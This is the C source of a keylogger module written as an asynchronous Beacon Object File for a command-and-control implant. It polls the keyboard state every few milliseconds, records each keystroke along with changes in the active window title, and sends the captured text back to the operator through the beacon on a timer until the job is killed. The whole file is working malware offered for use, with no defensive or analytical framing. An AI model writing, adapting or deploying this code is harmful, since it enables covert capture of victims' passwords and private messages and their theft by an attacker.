/*
 * keylogger — Async BOF: buffer keystrokes and dump on interval
 *
 * Polls GetAsyncKeyState, accumulates text (+ window title changes),
 * dumps via BeaconPrintf every interval_ms until jobkill.
 *
 * Optional args:
 *   int32:interval_ms   dump interval (default 30000, min 1000)
 *
 * Example:
 *   keylogger
 *   keylogger -Interval 15000
 *   jobkill <keylogger_task_uuid>
 */
#include <windows.h>
#include "beacon.h"

#define POLL_MS          5
#define KEY_BUF_SIZE     4096
#define WIN_TITLE_LEN    256
#define DEFAULT_INTERVAL 30000
#define MIN_INTERVAL     1000

DECLSPEC_IMPORT SHORT WINAPI USER32$GetAsyncKeyState(INT vKey);
DECLSPEC_IMPORT SHORT WINAPI USER32$GetKeyState(INT nVirtKey);
DECLSPEC_IMPORT HWND  WINAPI USER32$GetForegroundWindow(VOID);
DECLSPEC_IMPORT INT   WINAPI USER32$GetWindowTextA(HWND hWnd, LPSTR lpString, INT nMaxCount);
DECLSPEC_IMPORT INT   WINAPI USER32$ToAscii(UINT uVirtKey, UINT uScanCode, CONST BYTE *lpKeyState, LPWORD lpChar, UINT uFlags);
DECLSPEC_IMPORT UINT  WINAPI USER32$MapVirtualKeyA(UINT uCode, UINT uMapType);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetTickCount(VOID);
DECLSPEC_IMPORT HLOCAL WINAPI KERNEL32$LocalAlloc(UINT uFlags, SIZE_T uBytes);
DECLSPEC_IMPORT HLOCAL WINAPI KERNEL32$LocalFree(HLOCAL hMem);
DECLSPEC_IMPORT INT   __cdecl MSVCRT$_snprintf(CHAR *s, size_t n, const CHAR *fmt, ...);
DECLSPEC_IMPORT INT   __cdecl MSVCRT$strcmp(const CHAR *s1, const CHAR *s2);
DECLSPEC_IMPORT SIZE_T __cdecl MSVCRT$strlen(const CHAR *s);
DECLSPEC_IMPORT VOID  __cdecl MSVCRT$memset(VOID *s, INT c, SIZE_T n);

typedef struct _KEYLOG_CTX {
    CHAR *buf;
    INT   len;
    INT   cap;
    BYTE *prevDown;
    HWND  lastHwnd;
    CHAR  lastTitle[WIN_TITLE_LEN];
} KEYLOG_CTX;

static VOID BufAppend(KEYLOG_CTX *ctx, const CHAR *s)
{
    SIZE_T n;
    INT remain;

    if (!ctx || !ctx->buf || !s || !s[0])
        return;

    n = MSVCRT$strlen(s);
    remain = ctx->cap - ctx->len - 1;
    if (remain <= 0)
        return;
    if ((INT)n > remain)
        n = (SIZE_T)remain;

    MSVCRT$_snprintf(ctx->buf + ctx->len, (SIZE_T)remain + 1, "%s", s);
    ctx->len += (INT)n;
    ctx->buf[ctx->len] = '\0';
}

static VOID BufAppendChar(KEYLOG_CTX *ctx, CHAR c)
{
    CHAR tmp[2];
    tmp[0] = c;
    tmp[1] = '\0';
    BufAppend(ctx, tmp);
}

static VOID BufClear(KEYLOG_CTX *ctx)
{
    if (!ctx || !ctx->buf)
        return;
    ctx->buf[0] = '\0';
    ctx->len = 0;
}

static VOID FlushDump(KEYLOG_CTX *ctx, BOOL forceEmpty)
{
    if (!ctx)
        return;
    if (ctx->len > 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[keylogger]\n%s\n", ctx->buf);
        BufClear(ctx);
        BeaconWakeup();
    } else if (forceEmpty) {
        /* nothing */
    }
}

static VOID CheckWindowChange(KEYLOG_CTX *ctx)
{
    HWND hwnd;
    CHAR title[WIN_TITLE_LEN];
    CHAR line[WIN_TITLE_LEN + 32];

    hwnd = USER32$GetForegroundWindow();
    title[0] = '\0';
    if (hwnd)
        USER32$GetWindowTextA(hwnd, title, WIN_TITLE_LEN);
    title[WIN_TITLE_LEN - 1] = '\0';

    if (hwnd == ctx->lastHwnd && MSVCRT$strcmp(title, ctx->lastTitle) == 0)
        return;

    ctx->lastHwnd = hwnd;
    MSVCRT$_snprintf(ctx->lastTitle, WIN_TITLE_LEN, "%s", title);
    ctx->lastTitle[WIN_TITLE_LEN - 1] = '\0';

    if (title[0])
        MSVCRT$_snprintf(line, sizeof(line), "\n[Window: %s]\n", title);
    else
        MSVCRT$_snprintf(line, sizeof(line), "\n[Window: (none)]\n");
    line[sizeof(line) - 1] = '\0';
    BufAppend(ctx, line);
}

static VOID MapSpecialKey(KEYLOG_CTX *ctx, INT vk)
{
    switch (vk) {
    case VK_BACK:   BufAppend(ctx, "[BACKSPACE]"); break;
    case VK_TAB:    BufAppend(ctx, "[TAB]"); break;
    case VK_RETURN: BufAppend(ctx, "[ENTER]\n"); break;
    case VK_ESCAPE: BufAppend(ctx, "[ESC]"); break;
    case VK_SPACE:  BufAppendChar(ctx, ' '); break;
    case VK_DELETE: BufAppend(ctx, "[DEL]"); break;
    case VK_LEFT:   BufAppend(ctx, "[LEFT]"); break;
    case VK_UP:     BufAppend(ctx, "[UP]"); break;
    case VK_RIGHT:  BufAppend(ctx, "[RIGHT]"); break;
    case VK_DOWN:   BufAppend(ctx, "[DOWN]"); break;
    case VK_HOME:   BufAppend(ctx, "[HOME]"); break;
    case VK_END:    BufAppend(ctx, "[END]"); break;
    case VK_PRIOR:  BufAppend(ctx, "[PGUP]"); break;
    case VK_NEXT:   BufAppend(ctx, "[PGDN]"); break;
    case VK_INSERT: BufAppend(ctx, "[INS]"); break;
    case VK_LWIN:
    case VK_RWIN:   BufAppend(ctx, "[WIN]"); break;
    case VK_APPS:   BufAppend(ctx, "[MENU]"); break;
    default:
        if (vk >= VK_F1 && vk <= VK_F12) {
            CHAR tmp[8];
            MSVCRT$_snprintf(tmp, sizeof(tmp), "[F%d]", vk - VK_F1 + 1);
            BufAppend(ctx, tmp);
        }
        break;
    }
}

static BOOL IsModifierVk(INT vk)
{
    return (vk == VK_SHIFT || vk == VK_LSHIFT || vk == VK_RSHIFT
        || vk == VK_CONTROL || vk == VK_LCONTROL || vk == VK_RCONTROL
        || vk == VK_MENU || vk == VK_LMENU || vk == VK_RMENU
        || vk == VK_CAPITAL || vk == VK_NUMLOCK || vk == VK_SCROLL);
}

static VOID SampleKeys(KEYLOG_CTX *ctx)
{
    BYTE keyState[256];
    INT vk;
    WORD ch;
    UINT scan;

    CheckWindowChange(ctx);

    MSVCRT$memset(keyState, 0, sizeof(keyState));
    for (vk = 0; vk < 256; vk++) {
        SHORT st = USER32$GetAsyncKeyState(vk);
        keyState[vk] = (BYTE)((st & 0x8000) ? 0x80 : 0);
    }
    if (USER32$GetKeyState(VK_CAPITAL) & 1)
        keyState[VK_CAPITAL] |= 0x01;

    for (vk = 0x08; vk <= 0xFE; vk++) {
        BOOL down;

        if (IsModifierVk(vk))
            continue;

        down = (keyState[vk] & 0x80) != 0;
        if (!down) {
            ctx->prevDown[vk] = 0;
            continue;
        }
        if (ctx->prevDown[vk])
            continue;
        ctx->prevDown[vk] = 1;

        /* Named / navigation keys */
        if (vk == VK_BACK || vk == VK_TAB || vk == VK_RETURN || vk == VK_ESCAPE
            || vk == VK_SPACE || vk == VK_DELETE
            || (vk >= VK_LEFT && vk <= VK_DOWN)
            || vk == VK_HOME || vk == VK_END || vk == VK_PRIOR || vk == VK_NEXT
            || vk == VK_INSERT || vk == VK_LWIN || vk == VK_RWIN || vk == VK_APPS
            || (vk >= VK_F1 && vk <= VK_F12)) {
            MapSpecialKey(ctx, vk);
            continue;
        }

        scan = USER32$MapVirtualKeyA((UINT)vk, 0);
        ch = 0;
        if (USER32$ToAscii((UINT)vk, scan, keyState, &ch, 0) == 1) {
            CHAR c = (CHAR)(ch & 0xFF);
            if (c >= 32 && c < 127)
                BufAppendChar(ctx, c);
        }
    }
}

void go(char * args, int len)
{
    datap parser;
    int intervalMs = DEFAULT_INTERVAL;
    HANDLE hStop;
    KEYLOG_CTX ctx;
    DWORD lastDump;
    DWORD now;

    MSVCRT$memset(&ctx, 0, sizeof(ctx));

    if (len > 0) {
        BeaconDataParse(&parser, args, len);
        if (BeaconDataLength(&parser) >= 4)
            intervalMs = BeaconDataInt(&parser);
    }
    if (intervalMs < MIN_INTERVAL)
        intervalMs = MIN_INTERVAL;

    ctx.buf = (CHAR *)KERNEL32$LocalAlloc(LPTR, KEY_BUF_SIZE);
    ctx.prevDown = (BYTE *)KERNEL32$LocalAlloc(LPTR, 256);
    if (!ctx.buf || !ctx.prevDown) {
        BeaconPrintf(CALLBACK_ERROR, "[keylogger] LocalAlloc failed\n");
        BeaconWakeup();
        goto cleanup;
    }
    ctx.cap = KEY_BUF_SIZE;
    ctx.len = 0;
    ctx.lastHwnd = NULL;
    ctx.lastTitle[0] = '\0';

    hStop = BeaconGetStopJobEvent();
    lastDump = KERNEL32$GetTickCount();

    BeaconPrintf(CALLBACK_OUTPUT,
        "[keylogger] started (interval=%d ms, stopEvent=%p)\n",
        intervalMs, hStop);
    BeaconWakeup();

    CheckWindowChange(&ctx);

    for (;;) {
        DWORD waitResult;

        if (hStop == NULL)
            break;

        waitResult = KERNEL32$WaitForSingleObject(hStop, (DWORD)POLL_MS);
        if (waitResult == WAIT_OBJECT_0)
            break;

        SampleKeys(&ctx);

        now = KERNEL32$GetTickCount();
        if ((now - lastDump) >= (DWORD)intervalMs) {
            FlushDump(&ctx, FALSE);
            lastDump = now;
        }
    }

    FlushDump(&ctx, FALSE);
    BeaconPrintf(CALLBACK_OUTPUT, "[keylogger] stopped\n");
    BeaconWakeup();

cleanup:
    if (ctx.buf)
        KERNEL32$LocalFree(ctx.buf);
    if (ctx.prevDown)
        KERNEL32$LocalFree(ctx.prevDown);
}
